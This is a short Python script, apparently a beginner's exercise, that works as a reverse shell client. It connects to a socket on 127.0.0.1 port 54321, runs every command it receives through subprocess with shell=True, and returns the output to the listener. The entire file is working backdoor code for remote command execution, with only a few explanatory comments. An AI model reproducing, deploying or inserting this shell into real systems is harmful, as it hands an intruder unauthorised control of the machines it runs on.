#!/usr/bin/python
import socket
import subprocess # this allow us to input something in the cli

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
sock.connect(("127.0.0.1", 54321))
print("connection establish to server")

while True:
	command = sock.recv(1024) # receive bytes
	if command  == "q":
		break
	else:
		process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
		result = process.stdout.read() + process.stderr.read()
		sock.send(result)
sock.close()
